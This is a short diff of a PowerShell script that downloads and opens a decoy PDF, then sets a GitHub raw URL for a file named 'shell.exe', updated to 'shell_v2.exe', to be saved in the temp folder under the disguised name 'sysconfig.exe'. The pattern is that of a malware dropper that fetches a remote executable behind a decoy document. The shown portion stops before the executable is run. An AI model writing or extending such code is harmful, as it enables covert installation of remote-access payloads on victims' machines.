@@ -9,7 +9,7 @@ Invoke-WebRequest -Uri $PdfUrl -OutFile $OutputPath
 Start-Process -FilePath $OutputPath
 
 # Define the URL and output file path
-$ShellUrl = "https://raw.githubusercontent.com/matteoporfi/tokens/refs/heads/main/shell.exe" 
+$ShellUrl = "https://raw.githubusercontent.com/matteoporfi/tokens/refs/heads/main/shell_v2.exe" 
 $ShellOutputPath = "$env:TEMP\sysconfig.exe"
 
 # Download the PDF
